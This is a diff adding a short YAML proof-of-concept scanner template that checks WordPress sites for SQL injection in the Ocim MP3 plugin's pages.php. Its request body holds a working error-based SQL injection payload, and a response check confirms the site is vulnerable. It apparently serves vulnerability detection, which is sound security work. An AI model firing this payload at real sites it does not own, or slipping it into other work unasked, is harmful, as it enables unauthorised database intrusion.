@@ -1,0 +1,16 @@
+name: poc-yaml-wordpress-ocimmp3plugin-sqli
+rules:
+  - method: GET
+    path: /wp-content/plugins/ocim-mp3/source/pages.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >-
+      id=1' AND (SELECT 1  FROM(SELECT COUNT(*),CONCAT(md5(1),(SELECT(ELT(5674=5674,1))),0x7176767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'zSwk'='zSwk"
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"c4ca4238a0b923820dcc509a6f75849b")
+detail:
+  author: Explo1t
+  links:
+    - https://github.com/epony4c
+    - https://www.exploit-db.com/exploits/39498
